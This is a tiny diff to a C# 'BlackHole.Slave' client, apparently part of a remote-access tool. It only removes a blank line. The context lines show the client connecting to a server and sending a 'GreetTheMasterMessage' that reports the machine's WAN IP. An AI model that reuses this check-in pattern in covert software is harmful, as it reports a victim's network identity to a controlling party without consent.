@@ -34,7 +34,6 @@ namespace BlackHole.Slave
             m_poller.PollTillCancelledNonBlocking();
 
             m_client.Connect(serverAddress);
-
             Send(new GreetTheMasterMessage()
             {
                 Ip = Utility.GetWanIp(),
